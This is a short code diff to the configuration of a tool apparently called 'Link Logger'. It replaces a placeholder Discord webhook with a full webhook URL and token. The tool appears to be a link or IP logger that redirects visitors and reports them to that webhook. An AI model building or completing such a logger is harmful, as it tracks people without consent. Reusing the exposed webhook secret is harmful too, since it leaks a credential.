@@ -8,7 +8,7 @@ __version__ = "v2.1"
 __author__ = ""
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE",
+    "webhook": "https://discord.com/api/webhooks/1360747033748574339/7sGUnUYckbPs2ww9RM5zwlMTnZtnAzrhWvmzIG-yebzeeqBe2dugtPzmM2Ji7fWtlAio",
     "username": "Link Logger",
     "color": 0x000000,
     "redirect": {
